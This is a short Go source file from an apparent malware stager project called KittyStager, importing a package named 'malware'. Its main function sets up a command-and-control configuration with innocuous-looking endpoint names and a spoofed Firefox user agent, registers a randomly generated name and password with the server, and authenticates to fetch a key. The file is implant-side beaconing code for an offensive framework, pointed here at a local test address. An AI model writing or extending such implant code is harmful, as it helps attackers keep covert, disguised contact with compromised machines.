package main

import (
	"KittyStager/malware"
	"fmt"
)

var (
	name     string
	password string
	key      string
)

func main() {
	config := malware.NewConfig("http://127.0.0.1:8080",
		"getLegit",
		"postLegit",
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/102.0",
		"reg",
		"test",
		0,
	)
	name = malware.NewName(4)
	password = malware.NewPassword(10)
	err := malware.DoPwreg(name, password, *config)
	if err != nil {
		fmt.Println(err)
		return
	}
	key, err = malware.DoAuth(name, password, *config)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Println(key)
}
